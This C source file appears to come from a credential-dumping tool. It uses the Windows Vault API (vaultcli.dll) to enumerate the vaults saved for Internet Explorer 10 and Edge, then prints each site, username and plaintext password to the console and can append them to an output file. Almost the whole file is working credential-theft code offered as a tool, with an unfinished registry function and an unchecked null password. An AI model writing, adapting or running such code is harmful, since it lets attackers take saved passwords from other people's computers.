#include <stdlib.h>
#include <stdio.h>

#include <windows.h>
#include <wincrypt.h>
#include <shlobj.h>
#include <prtypes.h> 

#include "main.h"
#include "explorer.h"

VaultEnumerateVaults_t VaultEnumerateVaults = NULL;
VaultOpenVault_t VaultOpenVault = NULL;
VaultEnumerateItems_t VaultEnumerateItems = NULL;
VaultGetItem_t VaultGetItem = NULL;
VaultCloseVault_t VaultCloseVault = NULL;
VaultFree_t VaultFree = NULL;
HMODULE module_vault;


int get_ie_registry_creds() {

}

int load_ie_vault_libs() {
	module_vault = LoadLibrary("vaultcli.dll");
	if(module_vault == NULL) {
		fprintf(stderr, "LoadLibary() failure\n");
		return -1;
	}

	VaultEnumerateVaults = (VaultEnumerateVaults_t) GetProcAddress(module_vault, "VaultEnumerateVaults");
	VaultOpenVault = (VaultOpenVault_t)GetProcAddress(module_vault, "VaultOpenVault");
	VaultEnumerateItems = (VaultEnumerateItems_t)GetProcAddress(module_vault, "VaultEnumerateItems");
	VaultGetItem = (VaultGetItem_t)GetProcAddress(module_vault, "VaultGetItem");
	VaultCloseVault = (VaultCloseVault_t)GetProcAddress(module_vault, "VaultCloseVault");
	VaultFree = (VaultFree_t)GetProcAddress(module_vault, "VaultFree");

	if (!VaultEnumerateItems || !VaultEnumerateVaults || !VaultFree || !VaultOpenVault || !VaultCloseVault || !VaultGetItem) {
		fprintf(stderr, "GetProcAddress() failure\n");
		FreeLibrary(module_vault);
		return -1;						
	}

	return 1;
}

int get_ie_vault_creds(char *output_file) {
	if(load_ie_vault_libs() == -1) {
		fprintf(stderr, "load_explorer_libs() failure\n");
		return -1;
	}

	DWORD vaults_counter, items_counter;
	LPGUID vaults;
	HANDLE hVault;
	PVOID items;
	PVAULT_ITEM vault_items, pvault_items;
	//PVAULT_ITEM_7 vault_test, pvault_test;

	if(VaultEnumerateVaults(0, &vaults_counter, &vaults) != ERROR_SUCCESS) {
		fprintf(stderr, "VaultEnumerateVaults() failure\n");
		return -1;
	}

	FILE *output_fd;
	if(output_file != NULL) {
		output_fd = fopen(output_file, "ab");
	}

	for(int i = 0; i < vaults_counter; i++) {
		// We open the vault
		if (VaultOpenVault(&vaults[i], 0, &hVault) != ERROR_SUCCESS) {
			fprintf(stderr, "VaultOpenVault() failure\n");
			return -1;
		}

		if (VaultEnumerateItems(hVault, 512, &items_counter, &items) != ERROR_SUCCESS) {
			fprintf(stderr, "VaultEnumerateItems() failure\n");
			return -1;
		}
		vault_items = (PVAULT_ITEM)items;

		for(int j = 0; j < items_counter; j++) {
			printf("[+] Source: %ls\n", vault_items[j].FriendlyName);
			printf("[+] Website: %ls\n", vault_items[j].Resource->data.String);
			printf("[+] Username: %ls\n", vault_items[j].Identity->data.String);

			pvault_items = NULL;
			if (VaultGetItem(hVault, &vault_items[j].SchemaId, vault_items[j].Resource, vault_items[j].Identity, vault_items[j].PackageSid, NULL, 0, &pvault_items) != 0) {
				fprintf(stderr, "VaultGetItem() failure\n");		
			}

			// If the password is not empty
			if (pvault_items->Authenticator != NULL && pvault_items->Authenticator->data.String != NULL) {
				printf("[+] Password: %ls\n\n", pvault_items->Authenticator->data.String);
			}

			// FIXME: Handle if password is empty
			if(output_file != NULL) {
				fprintf(output_fd, "\"%ls\",\"%ls\",\"%ls\"", vault_items[j].Resource->data.String, vault_items[j].Identity->data.String, pvault_items->Authenticator->data.String);
			} 
			VaultFree(pvault_items);
		}	
		VaultFree(vault_items);
		VaultCloseVault(&hVault);
	}

	// We clean everything
	if(output_file != NULL) {
		fclose(output_fd);
	}
	VaultFree(vaults);
	FreeLibrary(module_vault);
	return 1;
}

int dump_explorer(int verbose, char *output_file) {
	puts("[*] Starting IE10 / MSEdge dump...\n");
	if(get_ie_vault_creds(output_file) == -1) {
		fprintf(stderr, "get_ie_vault_creds() failure\n");
	}

	//printf("[*] Starting IE7-IE9 dump...\n");
	//if(get_ie7_ie9_creds(args->output_file)) {
	//	fprintf(stderr, "get_ie7_ie9_creds() failure\n");
	//}
	
	return 1;
}
